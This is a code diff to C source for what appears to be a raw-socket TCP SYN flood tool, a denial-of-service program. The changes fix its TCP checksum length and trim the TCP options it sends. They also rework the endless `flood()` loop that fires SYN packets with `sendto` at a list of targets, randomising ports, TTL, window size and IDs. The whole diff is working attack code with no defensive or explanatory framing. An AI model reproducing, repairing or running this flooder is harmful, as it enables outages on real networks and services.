@@ -32,29 +32,32 @@ struct list
 	struct list *prev;
 };
 
-struct tcpOptions {
-        uint8_t msskind;
-        uint8_t msslen;
-        uint16_t mssvalue;
-        uint8_t nop_nouse;
-        uint8_t wskind;
-        uint8_t wslen;
-        uint8_t wsshiftcount;
-        uint8_t nop_nouse2;
-        uint8_t nop_nouse3;
-        uint8_t sackkind;
-        uint8_t sacklen;
-        uint8_t tstamp;
-        uint8_t tslen;
-        uint8_t tsno;
-        uint8_t tsval;
-        uint8_t tsclock;
-        uint8_t tsclockval;
-        uint8_t tssendval;
-        uint8_t tsecho;
-        uint8_t tsecho2;
-        uint8_t tsecho3;
-        uint8_t tsecho4;
+struct tcpOptions
+{
+	uint8_t msskind;
+	uint8_t msslen;
+	uint16_t mssvalue;
+	uint8_t nop_nouse;
+	uint8_t wskind;
+	uint8_t wslen;
+	uint8_t wsshiftcount;
+	uint8_t nop_nouse2;
+	uint8_t nop_nouse3;
+	uint8_t sackkind;
+	uint8_t sacklen;
+	/*
+	uint8_t tstamp;
+	uint8_t tslen;
+	uint8_t tsno;
+	uint8_t tsclockval;
+	uint8_t tssendval;
+	uint8_t tsval;
+	uint8_t tsclock;
+	uint8_t tsecho;
+	uint8_t tsecho2;
+	uint8_t tsecho3;
+	uint8_t tsecho4;
+	*/
 };
 
 struct list *head;
@@ -150,11 +153,11 @@ unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int optionLen)
 	pseudohead.dst_addr = iph->daddr;
 	pseudohead.zero = 0;
 	pseudohead.proto = 6;
-	pseudohead.length = htons(sizeof(struct tcphdr));
+	pseudohead.length = htons(sizeof(struct tcphdr) + optionLen);
 	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + optionLen;
 	unsigned short *tcp = malloc(totaltcp_len);
 	memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
-	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + optionLen); 
+	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + optionLen);
 	unsigned short output = csum(tcp, totaltcp_len);
 	free(tcp);
 	return output;
@@ -187,7 +190,7 @@ void setup_tcp_header(struct tcphdr *tcph)
 	tcph->psh = 0;
 	tcph->fin = 0;
 	tcph->rst = 0;
-	tcph->res2 = randnum(0,1);
+	tcph->res2 = 1;
 	tcph->doff = (sizeof(struct tcphdr) + sizeof(struct tcpOptions)) / 4;
 	tcph->syn = 1;
 	tcph->urg = 0;
@@ -198,28 +201,30 @@ void setup_tcp_header(struct tcphdr *tcph)
 
 void setup_tcpopts_header(struct tcpOptions *opts)
 {
-    opts->nop_nouse = 0x01;
-    opts->nop_nouse2 = 0x01;
-    opts->nop_nouse3 = 0x01;
-    opts->msskind = 0x02;
-    opts->mssvalue = htons(1460);
-    opts->msslen = 0x04;
-    opts->wskind = 0x03;
-    opts->wslen = 0x03;
-    opts->wsshiftcount = 0x07;
-    opts->sackkind = 0x04;
-    opts->sacklen = 0x02;
-    opts->tstamp = 0x08;
-    opts->tslen = 0x0a;
-    opts->tsno = randnum(1, 250);
-    opts->tsval = 0xd8;
-    opts->tsclock = 0xd9;
-    opts->tsclockval = 0x68;
-    opts->tssendval = 0xa3;
-    opts->tsecho = 0x00;
-    opts ->tsecho2 = 0x00;
-    opts->tsecho3 = 0x00;
-    opts->tsecho4 = 0x00;
+	opts->nop_nouse = 0x01;
+	opts->nop_nouse2 = 0x01;
+	opts->nop_nouse3 = 0x01;
+	opts->msskind = 0x02;
+	opts->mssvalue = htons(1460);
+	opts->msslen = 0x04;
+	opts->wskind = 0x03;
+	opts->wslen = 0x03;
+	opts->wsshiftcount = 0x07;
+	opts->sackkind = 0x04;
+	opts->sacklen = 0x02;
+	/*
+	opts->tstamp = 0x08;
+	opts->tslen = 0x0a;
+	opts->tsno = randnum(1, 250);
+	opts->tsclockval = 0x68;
+	opts->tssendval = 0xa3;
+	opts->tsval = 0xd8;
+	opts->tsclock = 0xd9;
+	opts->tsecho = 0x00;
+	opts ->tsecho2 = 0x00;
+	opts->tsecho3 = 0x00;
+	opts->tsecho4 = 0x00;
+	*/
 }
 
 void *flood(void *par1)
@@ -265,22 +270,27 @@ void *flood(void *par1)
 
 	while (1)
 	{
+		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
+		setup_tcpopts_header(opts);
 		tcph->check = 0;
-		tcph->doff = ((sizeof (struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
+		tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
 		tcph->dest = htons(ports[rand_cmwc() % 2]);
 		list_node = list_node->next;
 		iph->saddr = sin.sin_addr.s_addr;
 		iph->daddr = list_node->data.sin_addr.s_addr;
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
-		tcph->ack_seq = randnum(10000, 99999);
-		tcph->window = htons(windows[rand_cmwc() % 4]);
-		iph->ttl = randnum(64, 255);
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
-		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
-		if (floodport == 0) 
+		tcph->ack_seq = randnum(10000, 99999);
+		iph->ttl = randnum(64, 255);
+		tcph->window = htons(windows[rand_cmwc() % 4]);
+
+		if (floodport == 0)
+		{
 			tcph->source = htons(rand_cmwc() % 0xFFFF);
+		}
 
 		tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+
 		pps++;
 
 		if (i >= limiter)
